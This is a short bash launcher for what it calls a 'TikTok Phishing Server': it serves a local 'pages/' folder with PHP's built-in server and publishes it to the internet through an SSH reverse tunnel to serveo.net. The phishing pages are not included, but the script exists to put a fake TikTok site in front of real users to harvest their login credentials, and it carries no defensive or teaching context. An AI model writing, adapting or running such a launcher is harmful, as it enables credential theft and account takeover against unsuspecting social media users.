#!/bin/bash
# Basic Tool Script
clear
echo "Starting TikTok Phishing Server..."
php -S 127.0.0.1:8080 -t pages/ &
ssh -R 80:127.0.0.1:8080 serveo.net
